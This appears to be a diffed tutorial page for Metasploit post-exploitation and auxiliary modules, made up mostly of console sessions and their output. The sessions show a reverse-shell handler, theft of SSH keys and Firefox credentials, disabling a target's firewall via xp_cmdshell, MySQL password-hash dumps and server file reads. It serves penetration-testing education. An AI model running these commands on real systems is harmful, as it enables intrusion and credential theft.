+The “enum_osx” post module gathers basic system information from Mac OS X Tiger, Leopard, Snow Leopard and Lion systems.
+
+::
+
+  msf > use post/osx/gather/enum_osx
+ msf  post(enum_osx) > run
+
+ [*] Running module against Victim.local
+ [*] This session is running as root!
+ [*] Saving all data to /root/.msf4/logs/post/enum_osx/Victim.local_20120926.3521
+ [*] 	Enumerating OS
+ [*] 	Enumerating Network
+ [*] 	Enumerating Bluetooth
+ [*] 	Enumerating Ethernet
+ [*] 	Enumerating Printers
+ [*] 	Enumerating USB
+ [*] 	Enumerating Airport
+ [*] 	Enumerating Firewall
+ [*] 	Enumerating Known Networks
+ [*] 	Enumerating Applications
+ [*] 	Enumerating Development Tools
+ [*] 	Enumerating Frameworks
+ [*] 	Enumerating Logs
+ [*] 	Enumerating Preference Panes
+ [*] 	Enumerating StartUp
+ [*] 	Enumerating TCP Connections
+ [*] 	Enumerating UDP Connections
+ [*] 	Enumerating Environment Variables
+ [*] 	Enumerating Last Boottime
+ [*] 	Enumerating Current Activity
+ [*] 	Enumerating Process List
+ [*] 	Enumerating Users
+ [*] 	Enumerating Groups
+ [*] .ssh Folder is present for Victim
+ [*] 	Downloading id_dsa
+ [*] 	Downloading known_hosts
+ [*] .gnupg Folder is present for Victim
+ [*] 	Downloading ls: /Users/Victim/.gnupg: No such file or directory
+ [*] Capturing screenshot
+ [*] Capturing screenshot for each loginwindow process since privilege is root
+ [*] 	Capturing for PID:2508
+ ...snip...
+ [*] Post module execution completed
+
+
+::
+
+  root@kali:~/.msf4/logs/post/enum_osx/RJLAP4.local_20120926.3521# ls
+ Airport.txt                Firewall.txt        OS.txt                                               TCP Connections.txt
+ Applications.txt           Frameworks.txt      OS X Gather Mac OS X System Information Enumeration  UDP Connections.txt
+ Bluetooth.txt              Groups.txt          Preference Panes.txt                                 USB.txt
+ Current Activity.txt       Known Networks.txt  Printers.txt                                         Users.txt
+ Development Tools.txt      Last Boottime.txt   Process List.txt
+ Environment Variables.txt  Logs.txt            screenshot_2058.jpg
+ Ethernet.txt               Network.txt         StartUp.txt
+
+
+::
+
+  root@kali:~/.msf4/logs/post/enum_osx/Victim.local_20120926.3521# more Firewall.txt
+ Firewall:
+
+    Firewall Settings:
+
+      Mode: Block all incoming connections
+      Firewall Logging: Yes
+      Stealth Mode: Yes
+
+
+::
+
+  root@kali:~/.msf4/logs/post/enum_osx/Victim.local_20120926.3521# more OS.txt
+ Software:
+
+    System Software Overview:
+
+      System Version: Mac OS X 10.7.4 (11E53)
+      Kernel Version: Darwin 11.4.0
+      Boot Volume: Macintosh HD
+      Boot Mode: Normal
+      Computer Name: Victim
+      User Name: System Administrator (root)
+      Secure Virtual Memory: Enabled
+      64-bit Kernel and Extensions: Yes
+      Time since boot: 12:13
+
+
+Multiple OS
+============
+
+Gather Modules
+^^^^^^^^^^^^^^
+
+env
+"""""""""
+
+The “env” module will collect and display the operating system environment variables on the compromised system.
+
+::
+
+  meterpreter > run post/multi/gather/env
+
+ ComSpec=C:\WINDOWS\system32\cmd.exe
+ FP_NO_HOST_CHECK=NO
+ NUMBER_OF_PROCESSORS=1
+ OS=Windows_NT
+ PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH
+ PROCESSOR_ARCHITECTURE=x86
+ PROCESSOR_IDENTIFIER=x86 Family 6 Model 37 Stepping 2, GenuineIntel
+ PROCESSOR_LEVEL=6
+ PROCESSOR_REVISION=2502
+ Path=C:\Perl\site\bin;C:\Perl\bin;C:\WINDOWS\system32;C:\WINDOWS;C:\WINDOWS\System32\Wbem;c:\python25;c:\Program Files\Microsoft SQL Server\90\Tools\$
+ TEMP=C:\WINDOWS\TEMP
+ TMP=C:\WINDOWS\TEMP
+ windir=C:\WINDOWS
+ meterpreter >
+
+
+firefox_creds
+"""""""""""""
+
+The “firefox_creds” post-exploitation module gathers saved credentials and cookies from an installed instance of Firefox on the compromised host. Third-party tools can then be used to extract the passwords if there is no master password set on the database.
+
+
+::
+
+  meterpreter > run post/multi/gather/firefox_creds
+
+ [*] Checking for Firefox directory in: C:\Documents and Settings\Administrator\Application Data\Mozilla\
+ [*] Found Firefox installed
+ [*] Locating Firefox Profiles...
+
+ [+] Found Profile 8r4i3uac.default
+ [+] Downloading cookies.sqlite file from: C:\Documents and Settings\Administrator\Application Data\Mozilla\Firefox\Profiles\8r4i3uac.default
+ [+] Downloading cookies.sqlite-journal file from: C:\Documents and Settings\Administrator\Application Data\Mozilla\Firefox\Profiles\8r4i3uac.default
+ [+] Downloading key3.db file from: C:\Documents and Settings\Administrator\Application Data\Mozilla\Firefox\Profiles\8r4i3uac.default
+ [+] Downloading signons.sqlite file from: C:\Documents and Settings\Administrator\Application Data\Mozilla\Firefox\Profiles\8r4i3uac.default
+ meterpreter >
+
+
+ssh_creds
+"""""""""
+
+The “ssh_creds” module will collect the contents of user’s .ssh directory on the targeted machine. Additionally, known_hosts and authorized_keys and any other files are also downloaded.
+
+
+::
+
+  msf > use exploit/multi/handler
+ msf exploit(handler) > set PAYLOAD linux/x86/shell_reverse_tcp
+ payload => linux/x86/shell_reverse_tcp
+ msf exploit(handler) > set LHOST 192.168.1.101
+ lhost => 192.168.1.101
+ msf exploit(handler) > set LPORT 443
+ lport => 443
+ msf exploit(handler) > exploit
+
+ [*] Started reverse handler on 192.168.1.101:443
+ [*] Starting the payload handler...
+ [*] Command shell session 1 opened (192.168.1.101:443 -> 192.168.1.101:37059) at 2011-06-02 11:06:02 -0600
+
+ id
+ uid=0(root) gid=0(root) groups=0(root)
+ ^Z
+ Background session 1? [y/N]  y
+
+ msf exploit(handler) > use post/multi/gather/ssh_creds
+ msf post(ssh_creds) > show options
+
+ Module options (post/multi/gather/ssh_creds):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   yes       The session to run this module on.
+
+ msf post(ssh_creds) > set SESSION 1
+ session => 1
+ msf post(ssh_creds) > run
+
+ [*] Determining session platform and type...
+ [*] Checking for OpenSSH profile in: /bin/.ssh
+ [-] OpenSSH profile not found in /bin/.ssh
+ [*] Checking for OpenSSH profile in: /dev/.ssh
+ …snip…
+ [-] OpenSSH profile not found in /var/www/.ssh
+ [+] Downloading /root/.ssh/authorized_keys
+ [+] Downloading /root/.ssh/authorized_keys2
+ [+] Downloading /root/.ssh/id_rsa
+ [+] Downloading /root/.ssh/id_rsa.pub
+ [+] Downloading /root/.ssh/known_hosts
+ [+] Downloading /usr/NX/home/nx/.ssh/authorized_keys2
+ [+] Downloading /usr/NX/home/nx/.ssh/default.id_dsa.pub
+ [+] Downloading /usr/NX/home/nx/.ssh/known_hosts
+ [+] Downloading /usr/NX/home/nx/.ssh/restore.id_dsa.pub
+ [*] Post module execution completed
+ msf post(ssh_creds) >
+
+
+General Modules
+^^^^^^^^^^^^^^
+
+
+execute
+""""""""
+
+This module will execute arbritrary commands to an open sessions. Works on Windows, Linux, OSX and Unix platforms.
+
+::
+
+  msf  post(execute) >
+ [*] 10.10.0.100      java_jre17_exec - Java 7 Applet Remote Code Execution handling request
+ [*] Sending stage (2976 bytes) to 10.10.0.100
+ [*] Command shell session 1 opened (10.10.0.151:4444 -> 10.10.0.100:1173) at 2012-08-31 15:06:06 -0400
+
+ msf  post(execute) > show options
+
+ Module options (post/multi/general/execute):
+
+   Name     Current Setting       Required  Description
+   ----     ---------------       --------  -----------
+   COMMAND  echo hell > file.txt  no        The entire command line to execute on the session
+   SESSION  1                     yes       The session to run this module on.
+
+ msf  post(execute) > run
+
+ [*] Executing echo hell > file.txt on #>Session:shell 10.10.0.100:1173 (10.10.0.100) "Microsoft Windows XP [Version 5.1.2600] (C) Copyright 1985-2001 Microsoft Corp. C:\Documents and Settings\administrator\Desktop>">...
+ [*] Response:
+ [*] Post module execution completed
+
+ msf  post(execute) >  sessions -i 1
+ [*] Starting interaction with 1...
+
+ Microsoft Windows XP [Version 5.1.2600]
+ (C) Copyright 1985-2001 Microsoft Corp.
+
+ C:\Documents and Settings\administrator\Desktop> dir
+ dir
+  Volume in drive C has no label.
+  Volume Serial Number is 2CB7-2817
+
+ Directory of C:\Documents and Settings\administrator\Desktop
+
+ 08/31/2012  09:04 AM    >DIR>          .
+ 08/31/2012  09:04 AM    >DIR>          ..
+ 08/31/2012  09:04 AM                46 file.txt
+ 12/29/2011  03:52 PM                70 portlist.txt
+               2 File(s)          1,431 bytes
+               2 Dir(s)   4,899,721,216 bytes free
+
+ C:\Documents and Settings\administrator\Desktop>
+
+
+malware_check
+"""""""""""""
+
+This module uploads a file to virustotal.com, and displays the scan results. It can also be run directly from within a meterpreter session. Works on Windows, Linux, OSX and Unix platforms.
+
+::
+
+  msf post(check_malware) > show options
+
+ Module options (post/multi/gather/check_malware):
+
+   Name        Current Setting      Required  Description
+   ----        ---------------      --------  -----------
+   APIKEY                           yes       VirusTotal API key
+   REMOTEFILE  C:\msfrev.exe        yes       A file to check from the remote machine
+   SESSION     1                    yes       The session to run this module on.
+
+
+::
+
+  msf post(check_malware) > run
+
+ [*] 192.168.101.129 - Checking: C:\\msfrev.exe...
+ [*] 192.168.101.129 - VirusTotal message: Scan finished, information embedded
+ [*] 192.168.101.129 - MD5: 88b90ef2641ed89aa9506264a46df29a
+ [*] 192.168.101.129 - SHA1: 9767f651321c5cac786312f59a1c046ac1e27ad3
+ [*] 192.168.101.129 - SHA256: 04fb3ba1ccb64371f75b0b54d1dc7f20dcef2c6f773d7682b3d7f57d4691d296
+ [*] Analysis Report: C:\msfrev.exe (38 / 55):
+
+ =====================================================================================================================================
+
+ Antivirus             Detected  Version        Result                           Update
+ ---------             --------  -------        ------                           ------
+ ALYac                 true      1.0.1.5        Gen:Variant.Zusy.Elzob.8031      20151125
+ AVG                   true      16.0.0.4460    Agent                            20151125
+ AVware                true      1.5.0.21       Trojan.Win32.Swrort.B (v)        20151124
+ Ad-Aware              true      12.0.163.0     Gen:Variant.Zusy.Elzob.8031      20151125
+ AegisLab              false     1.5                                             20151125
+ Agnitum               true      5.5.1.3        Trojan.Rosena.Gen.1              20151124
+ AhnLab-V3             true      2015.11.26.00  Trojan/Win32.Shell               20151125
+ Alibaba               false     1.0                                             20151125
+ Arcabit               true      1.0.0.624      Trojan.Zusy.Elzob.D1F5F          20151125
+ Avast                 true      8.0.1489.320   Win32:SwPatch [Wrm]              20151125
+ Avira                 true      8.3.2.4        TR/Crypt.EPACK.Gen2              20151125
+ Baidu-International   true      3.5.1.41473    Trojan.Win32.Rozena.AM           20151124
+ BitDefender           true      7.2            Gen:Variant.Zusy.Elzob.8031      20151125
+ Bkav                  false     1.3.0.7383                                      20151125
+ ByteHero              false     1.0.0.1                                         20151125
+ CAT-QuickHeal         true      14.00          Trojan.Swrort.A                  20151125
+ CMC                   false     1.1.0.977                                       20151124
+ ClamAV                true      0.98.5.0       Win.Trojan.MSShellcode-7         20151125
+ Comodo                true      23654          TrojWare.Win32.Rozena.A          20151125
+ Cyren                 true      5.4.16.7       W32/Swrort.A                     20151125
+ DrWeb                 true      7.0.16.10090   Trojan.Swrort.1                  20151125
+ ESET-NOD32            true      12622          a variant of Win32/Rozena.AM     20151125
+ Emsisoft              true      3.5.0.642      Gen:Variant.Zusy.Elzob.8031 (B)  20151125
+ F-Prot                true      4.7.1.166      W32/Swrort.A                     20151125
+ F-Secure              true      11.0.19100.45  Gen:Variant.Zusy.Elzob.8031      20151125
+ Fortinet              true      5.1.220.0      W32/Swrort.C!tr                  20151125
+ GData                 true      25             Gen:Variant.Zusy.Elzob.8031      20151125
+ Ikarus                true      T3.1.9.5.0     Trojan.Win32.Swrort              20151125
+ Jiangmin              false     16.0.100                                        20151124
+ K7AntiVirus           true      9.212.17966    Backdoor ( 04c53cce1 )           20151125
+ K7GW                  true      9.212.17968    Backdoor ( 04c53cce1 )           20151125
+ Kaspersky             true      15.0.1.10      HEUR:Trojan.Win32.Generic        20151125
+ Malwarebytes          true      2.1.1.1115     Backdoor.Bot.Gen                 20151125
+ ...snip...
+
+ [*] Post module execution completed
+
+
+::
+
+  meterpreter > run post/multi/gather/check_malware REMOTEFILE=C:\\msfrev.exe
+
+ [*] 192.168.101.129 - Checking: C:\Users\loneferret\Downloads\msfrev.exe...
+ [*] 192.168.101.129 - VirusTotal message: Scan finished, information embedded
+ [*] 192.168.101.129 - MD5: 88b90ef2641ed89aa9506264a46df29a
+ [*] 192.168.101.129 - SHA1: 9767f651321c5cac786312f59a1c046ac1e27ad3
+ [*] 192.168.101.129 - SHA256: 04fb3ba1ccb64371f75b0b54d1dc7f20dcef2c6f773d7682b3d7f57d4691d296
+ [*] Analysis Report: C:\\msfrev.exe (35 / 54):
+
+ =====================================================================================================================================
+
+ Antivirus             Detected  Version        Result                         Update
+ ---------             --------  -------        ------                         ------
+ ALYac                 true      1.0.1.5        Gen:Variant.Zusy.Elzob.8031    20151125
+ AVG                   true      16.0.0.4460    Agent                          20151125
+ AVware                true      1.5.0.21       Trojan.Win32.Swrort.B (v)      20151124
+ Ad-Aware              true      12.0.163.0     Gen:Variant.Zusy.Elzob.8031    20151125
+ AegisLab              false     1.5                                           20151125
+ Agnitum               true      5.5.1.3        Trojan.Rosena.Gen.1            20151124
+ ..snip..
+
+
+
+*******************
+Auxiliary Module
+******************
+
+
+Admin
+^^^^^^^^^^
+
+HTTP
+""""""""
+
+**tomcat_administration**
+
+
+The “tomcat_administration” module scans a range of IP addresses and locates the Tomcat Server administration panel and version.
+
+::
+
+  msf > use auxiliary/admin/http/tomcat_administration
+ msf auxiliary(tomcat_administration) > show options
+
+ Module options (auxiliary/admin/http/tomcat_administration):
+
+   Name         Current Setting  Required  Description
+   ----         ---------------  --------  -----------
+   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                        yes       The target address range or CIDR identifier
+   RPORT        8180             yes       The target port (TCP)
+   SSL          false            no        Negotiate SSL/TLS for outgoing connections
+   THREADS      1                yes       The number of concurrent threads
+   TOMCAT_PASS                   no        The password for the specified username
+   TOMCAT_USER                   no        The username to authenticate as
+   VHOST                         no        HTTP server virtual host
+
+
+To configure the module, we set the RHOSTS and THREADS values and let it run against the default port.
+
+::
+
+  msf auxiliary(tomcat_administration) > set RHOSTS 192.168.1.200-210
+ RHOSTS => 192.168.1.200-210
+ msf auxiliary(tomcat_administration) > set THREADS 11
+ THREADS => 11
+ msf auxiliary(tomcat_administration) > run
+
+ [*] http://192.168.1.200:8180/admin [Apache-Coyote/1.1] [Apache Tomcat/5.5] [Tomcat Server Administration] [tomcat/tomcat]
+ [*] Scanned 05 of 11 hosts (045% complete)
+ [*] Scanned 06 of 11 hosts (054% complete)
+ [*] Scanned 08 of 11 hosts (072% complete)
+ [*] Scanned 09 of 11 hosts (081% complete)
+ [*] Scanned 11 of 11 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(tomcat_administration) >
+
+MSSQL
+"""""""""
+
+**mssql_enum**
+
+The “mssql_enum” is an admin module that will accept a set of credentials and query a MSSQL for various configuration settings.
+
+::
+
+  msf > use auxiliary/admin/mssql/mssql_enum
+ msf auxiliary(mssql_enum) > show options
+
+ Module options (auxiliary/admin/mssql/mssql_enum):
+
+   Name                 Current Setting  Required  Description
+   ----                 ---------------  --------  -----------
+   PASSWORD                              no        The password for the specified username
+   RHOST                                 yes       The target address
+   RPORT                1433             yes       The target port (TCP)
+   TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data "Force Encryption"
+   USERNAME             sa               no        The username to authenticate as
+   USE_WINDOWS_AUTHENT  false            yes       Use windows authentification (requires DOMAIN option set)
+
+
+To configure the module, we accept the default username, set our PASSWORD and RHOST, then let it run.
+
+
+::
+
+  msf auxiliary(mssql_enum) > set PASSWORD password1
+ PASSWORD => password1
+ msf auxiliary(mssql_enum) > set RHOST 192.168.1.195
+ RHOST => 192.168.1.195
+ msf auxiliary(mssql_enum) > run
+
+ [*] Running MS SQL Server Enumeration...
+ [*] Version:
+ [*]	Microsoft SQL Server 2005 - 9.00.1399.06 (Intel X86)
+ [*]		Oct 14 2005 00:33:37
+ [*]		Copyright (c) 1988-2005 Microsoft Corporation
+ [*]		Express Edition on Windows NT 5.1 (Build 2600: Service Pack 2)
+ [*] Configuration Parameters:
+ [*] 	C2 Audit Mode is Not Enabled
+ [*] 	xp_cmdshell is Not Enabled
+ [*] 	remote access is Enabled
+ [*] 	allow updates is Not Enabled
+ [*] 	Database Mail XPs is Not Enabled
+ [*] 	Ole Automation Procedures are Not Enabled
+ [*] Databases on the server:
+ [*] 	Database name:master
+ [*] 	Database Files for master:
+ [*] 		c:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\master.mdf
+ [*] 		c:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\mastlog.ldf
+ [*] 	Database name:tempdb
+ [*] 	Database Files for tempdb:
+ [*] 		c:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\tempdb.mdf
+ [*] 		c:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\templog.ldf
+ [*] 	Database name:model
+ [*] 	Database Files for model:
+ [*] 		c:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\model.mdf
+ [*] 		c:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\modellog.ldf
+ [*] 	Database name:msdb
+ [*] 	Database Files for msdb:
+ [*] 		c:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\MSDBData.mdf
+ [*] 		c:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\MSDBLog.ldf
+ [*] System Logins on this Server:
+ [*] 	sa
+ [*] 	##MS_SQLResourceSigningCertificate##
+ [*] 	##MS_SQLReplicationSigningCertificate##
+ [*] 	##MS_SQLAuthenticatorCertificate##
+ [*] 	##MS_AgentSigningCertificate##
+ [*] 	BUILTIN\Administrators
+ [*] 	NT AUTHORITY\SYSTEM
+ [*] 	V-MAC-XP\SQLServer2005MSSQLUser$V-MAC-XP$SQLEXPRESS
+ [*] 	BUILTIN\Users
+ [*] Disabled Accounts:
+ [*] 	No Disabled Logins Found
+ [*] No Accounts Policy is set for:
+ [*] 	All System Accounts have the Windows Account Policy Applied to them.
+ [*] Password Expiration is not checked for:
+ [*] 	sa
+ [*] System Admin Logins on this Server:
+ [*] 	sa
+ [*] 	BUILTIN\Administrators
+ [*] 	NT AUTHORITY\SYSTEM
+ [*] 	V-MAC-XP\SQLServer2005MSSQLUser$V-MAC-XP$SQLEXPRESS
+ [*] Windows Logins on this Server:
+ [*] 	NT AUTHORITY\SYSTEM
+ [*] Windows Groups that can logins on this Server:
+ [*] 	BUILTIN\Administrators
+ [*] 	V-MAC-XP\SQLServer2005MSSQLUser$V-MAC-XP$SQLEXPRESS
+ [*] 	BUILTIN\Users
+ [*] Accounts with Username and Password being the same:
+ [*] 	No Account with its password being the same as its username was found.
+ [*] Accounts with empty password:
+ [*] 	No Accounts with empty passwords where found.
+ [*] Stored Procedures with Public Execute Permission found:
+ [*] 	sp_replsetsyncstatus
+ [*] 	sp_replcounters
+ [*] 	sp_replsendtoqueue
+ [*] 	sp_resyncexecutesql
+ [*] 	sp_prepexecrpc
+ [*] 	sp_repltrans
+ [*] 	sp_xml_preparedocument
+ [*] 	xp_qv
+ [*] 	xp_getnetname
+ [*] 	sp_releaseschemalock
+ [*] 	sp_refreshview
+ [*] 	sp_replcmds
+ [*] 	sp_unprepare
+ [*] 	sp_resyncprepare
+ [*] 	sp_createorphan
+ [*] 	xp_dirtree
+ [*] 	sp_replwritetovarbin
+ [*] 	sp_replsetoriginator
+ [*] 	sp_xml_removedocument
+ [*] 	sp_repldone
+ [*] 	sp_reset_connection
+ [*] 	xp_fileexist
+ [*] 	xp_fixeddrives
+ [*] 	sp_getschemalock
+ [*] 	sp_prepexec
+ [*] 	xp_revokelogin
+ [*] 	sp_resyncuniquetable
+ [*] 	sp_replflush
+ [*] 	sp_resyncexecute
+ [*] 	xp_grantlogin
+ [*] 	sp_droporphans
+ [*] 	xp_regread
+ [*] 	sp_getbindtoken
+ [*] 	sp_replincrementlsn
+ [*] Instances found on this server:
+ [*] 	SQLEXPRESS
+ [*] Default Server Instance SQL Server Service is running under the privilege of:
+ [*] 	xp_regread might be disabled in this system
+ [*] Auxiliary module execution completed
+ msf auxiliary(mssql_enum) >
+
+
+
+**mssql_exec**
+
+The “mssql_exec” admin module takes advantage of the xp_cmdshell stored procedure to execute commands on the remote system. If you have acquired or guessed MSSQL admin credentials, this can be a very useful module.
+
+::
+
+  msf > use auxiliary/admin/mssql/mssql_exec
+ msf auxiliary(mssql_exec) > show options
+
+ Module options (auxiliary/admin/mssql/mssql_exec):
+
+   Name                 Current Setting                       Required  Description
+   ----                 ---------------                       --------  -----------
+   CMD                  cmd.exe /c echo OWNED > C:\owned.exe  no        Command to execute
+   PASSWORD                                                   no        The password for the specified username
+   RHOST                                                      yes       The target address
+   RPORT                1433                                  yes       The target port (TCP)
+   TDSENCRYPTION        false                                 yes       Use TLS/SSL for TDS data "Force Encryption"
+   USERNAME             sa                                    no        The username to authenticate as
+   USE_WINDOWS_AUTHENT  false                                 yes       Use windows authentification (requires DOMAIN option set)
+
+
+We set our RHOST and PASSWORD values and set the CMD to disable the Windows Firewall on the remote system. This can enable us to potentially exploit other services running on the target.
+
+::
+
+  msf auxiliary(mssql_exec) > set CMD netsh firewall set opmode disable
+ CMD => netsh firewall set opmode disable
+ msf auxiliary(mssql_exec) > set PASSWORD password1
+ PASSWORD => password1
+ msf auxiliary(mssql_exec) > set RHOST 192.168.1.195
+ RHOST => 192.168.1.195
+ msf auxiliary(mssql_exec) > run
+
+ [*] The server may have xp_cmdshell disabled, trying to enable it...
+ [*] SQL Query: EXEC master..xp_cmdshell 'netsh firewall set opmode disable'
+
+
+
+  output
+  ------
+  Ok.
+
+
+
+ [*] Auxiliary module execution completed
+ msf auxiliary(mssql_exec) >
+
+
+MySQL
+"""""""""
+
+**mysql_enum**
+
+The “mysql_enum” module will connect to a remote MySQL database server with a given set of credentials and perform some basic enumeration on it.
+
+::
+
+  msf > use auxiliary/admin/mysql/mysql_enum
+ msf auxiliary(mysql_enum) > show options
+
+ Module options (auxiliary/admin/mysql/mysql_enum):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   PASSWORD                   no        The password for the specified username
+   RHOST                      yes       The target address
+   RPORT     3306             yes       The target port
+   USERNAME                   no        The username to authenticate as
+
+
+To configure the module, we provide values for PASSWORD, RHOST, and USERNAME then let it run against the target.
+
+::
+
+  msf auxiliary(mysql_enum) > set PASSWORD s3cr3t
+ PASSWORD => s3cr3t
+ msf auxiliary(mysql_enum) > set RHOST 192.168.1.201
+ RHOST => 192.168.1.201
+ msf auxiliary(mysql_enum) > set USERNAME root
+ USERNAME => root
+ msf auxiliary(mysql_enum) > run
+
+ [*] Running MySQL Enumerator...
+ [*] Enumerating Parameters
+ [*] 	MySQL Version: 5.1.41
+ [*] 	Compiled for the following OS: Win32
+ [*] 	Architecture: ia32
+ [*] 	Server Hostname: xen-xp-sploit
+ [*] 	Data Directory: C:\xampp\mysql\data\
+ [*] 	Logging of queries and logins: OFF
+ [*] 	Old Password Hashing Algorithm OFF
+ [*] 	Loading of local files: ON
+ [*] 	Logins with old Pre-4.1 Passwords: OFF
+ [*] 	Allow Use of symlinks for Database Files: YES
+ [*] 	Allow Table Merge:
+ [*] 	SSL Connection: DISABLED
+ [*] Enumerating Accounts:
+ [*] 	List of Accounts with Password Hashes:
+ [*] 		User: root Host: localhost Password Hash: *58C036CDA51D8E8BBBBF2F9EA5ABF111ADA444F0
+ [*] 		User: pma Host: localhost Password Hash: *602F8827EA283047036AFA836359E3688401F6CF
+ [*] 		User: root Host: % Password Hash: *58C036CDA51D8E8BBBBF2F9EA5ABF111ADA444F0
+ [*] 	The following users have GRANT Privilege:
+ [*] 		User: root Host: localhost
+ [*] 		User: root Host: %
+ [*] 	The following users have CREATE USER Privilege:
+ [*] 		User: root Host: localhost
+ [*] 		User: root Host: %
+ [*] 	The following users have RELOAD Privilege:
+ [*] 		User: root Host: localhost
+ [*] 		User: root Host: %
+ [*] 	The following users have SHUTDOWN Privilege:
+ [*] 		User: root Host: localhost
+ [*] 		User: root Host: %
+ [*] 	The following users have SUPER Privilege:
+ [*] 		User: root Host: localhost
+ [*] 		User: root Host: %
+ [*] 	The following users have FILE Privilege:
+ [*] 		User: root Host: localhost
+ [*] 		User: root Host: %
+ [*] 	The following users have POCESS Privilege:
+ [*] 		User: root Host: localhost
+ [*] 		User: root Host: %
+ [*] 	The following accounts have privileges to the mysql databse:
+ [*] 		User: root Host: localhost
+ [*] 		User: root Host: %
+ [*] 	The following accounts are not restricted by source:
+ [*] 		User: root Host: %
+ [*] Auxiliary module execution completed
+ msf auxiliary(mysql_enum) >
+
+
+**mysql_sql**
+
+The “mysql_sql” module performs SQL queries on a remote server when provided with a valid set of credentials.
+
+::
+
+  msf > use auxiliary/admin/mysql/mysql_sql
+ msf auxiliary(mysql_sql) > show options
+
+ Module options (auxiliary/admin/mysql/mysql_sql):
+
+   Name      Current Setting   Required  Description
+   ----      ---------------   --------  -----------
+   PASSWORD                    no        The password for the specified username
+   RHOST                       yes       The target address
+   RPORT     3306              yes       The target port
+   SQL       select version()  yes       The SQL to execute.
+   USERNAME                    no        The username to authenticate as
+
+
+To configure the module, we provided the PASSWORD, RHOST, and USERNAME settings and we will leave the default query to pull the server version.
+
+::
+
+  msf auxiliary(mysql_sql) > set PASSWORD s3cr3t
+ PASSWORD => s3cr3t
+ msf auxiliary(mysql_sql) > set RHOST 192.168.1.201
+ RHOST => 192.168.1.201
+ msf auxiliary(mysql_sql) > set USERNAME root
+ USERNAME => root
+ msf auxiliary(mysql_sql) > run
+
+ [*] Sending statement: 'select version()'...
+ [*]  | 5.1.41 |
+ [*] Auxiliary module execution completed
+ msf auxiliary(mysql_sql) >
+
+
+Postgres
+""""""""
+
+
+**postgres_readfile**
+
+
+The “postgres_readfile” module, when provided with valid credentials for a PostgreSQL server, will read and display files of your choosing on the server.
+
+
+::
+
+  msf > use auxiliary/admin/postgres/postgres_readfile
+ msf auxiliary(postgres_readfile) > show options
+
+ Module options (auxiliary/admin/postgres/postgres_readfile):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   DATABASE  template1        yes       The database to authenticate against
+   PASSWORD                   no        The password for the specified username. Leave blank for a random password.
+   RFILE     /etc/passwd      yes       The remote file
+   RHOST                      yes       The target address
+   RPORT     5432             yes       The target port
+   USERNAME  postgres         yes       The username to authenticate as
+   VERBOSE   false            no        Enable verbose output
+
+
+In order to configure the module, we set the PASSWORD and RHOST values, set RFILE as the file we wish to read and let the module run.
+
+::
+
+  msf auxiliary(postgres_readfile) > set PASSWORD toor
+ PASSWORD => toor
+ msf auxiliary(postgres_readfile) > set RFILE /etc/hosts
+ RFILE => /etc/hosts
+ msf auxiliary(postgres_readfile) > set RHOST 127.0.0.1
+ RHOST => 127.0.0.1
+ msf auxiliary(postgres_readfile) > run
+
+ Query Text: 'CREATE TEMP TABLE UnprtSRXpcuMpN (INPUT TEXT);
+			COPY UnprtSRXpcuMpN FROM '/etc/hosts';
+			SELECT * FROM UnprtSRXpcuMpN'
+ ======================================================================================================================================
+
+    input
+    -----
+    127.0.0.1       localhost
+    127.0.1.1       ph33r
+
+    # The following lines are desirable for IPv6 capable hosts
+    ::1     ip6-localhost ip6-loopback
+    fe00::0 ip6-localnet
+    ff00::0 ip6-mcastprefix
+    ff02::1 ip6-allnodes
+    ff02::2 ip6-allrouters
+    ff02::3 ip6-allhosts
+
+ [*] Auxiliary module execution completed
+ msf auxiliary(postgres_readfile) >
+
+
+**postgres_sql**
+
+The “postgres_sql” module, when provided with valid credentials for a PostgreSQL server, will perform queries of your choosing and return the results.
+
+::
+
+  msf > use auxiliary/admin/postgres/postgres_sql
+ msf auxiliary(postgres_sql) > show options
+
+ Module options (auxiliary/admin/postgres/postgres_sql):
+
+   Name           Current Setting   Required  Description
+   ----           ---------------   --------  -----------
+   DATABASE       template1         yes       The database to authenticate against
+   PASSWORD                         no        The password for the specified username. Leave blank for a random password.
+   RETURN_ROWSET  true              no        Set to true to see query result sets
+   RHOST                            yes       The target address
+   RPORT          5432              yes       The target port
+   SQL            select version()  no        The SQL query to execute
+   USERNAME       postgres          yes       The username to authenticate as
+   VERBOSE        false             no        Enable verbose output
+
+
+The required configuration for this module is minimal as we will just set our PASSWORD and RHOST values, leave the default query to pull the server version, then let it run against our target.
+
+::
+
+  msf auxiliary(postgres_sql) > set PASSWORD toor
+ PASSWORD => toor
+ msf auxiliary(postgres_sql) > set RHOST 127.0.0.1
+ RHOST => 127.0.0.1
+ msf auxiliary(postgres_sql) > run
+
+ Query Text: 'select version()'
+ ==============================
+
+    version
+    -------
+    PostgreSQL 8.3.8 on i486-pc-linux-gnu, compiled by GCC gcc-4.3.real (Ubuntu 4.3.2-1ubuntu11) 4.3.2
+
+ [*] Auxiliary module execution completed
+ msf auxiliary(postgres_sql) >
+
+
+VMware
+"""""""""""
+
+**poweron_vm**
+
+The “poweron_vm” module will log into the Web API of VMware and try to power on a specified Virtual Machine.
+
+::
+
+  msf > use auxiliary/admin/vmware/poweron_vm
+ msf auxiliary(poweron_vm) > show options
+
+ Module options (auxiliary/admin/vmware/poweron_vm):
+
+   Name      Current Setting         Required  Description
+   ----      ---------------         --------  -----------
+   PASSWORD  vmwareESXpassword       yes       The password to Authenticate with.
+   Proxies                           no        Use a proxy chain
+   RHOST     192.168.1.52            yes       The target address
+   RPORT     443                     yes       The target port
+   USERNAME  root                    yes       The username to Authenticate with.
+   VHOST                             no        HTTP server virtual host
